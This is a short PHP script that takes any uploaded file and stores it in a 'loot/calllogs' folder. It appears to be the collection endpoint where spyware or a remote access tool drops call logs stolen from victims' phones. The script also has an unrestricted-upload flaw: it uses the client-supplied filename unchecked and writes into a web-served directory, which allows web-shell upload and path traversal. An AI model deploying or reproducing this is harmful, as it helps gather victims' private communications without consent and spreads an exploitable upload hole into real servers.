<?php
$id = rand(0,999);
move_uploaded_file($_FILES["file"]["tmp_name"],'./loot/calllogs/'. $id. $_FILES["file"]["name"]);
?>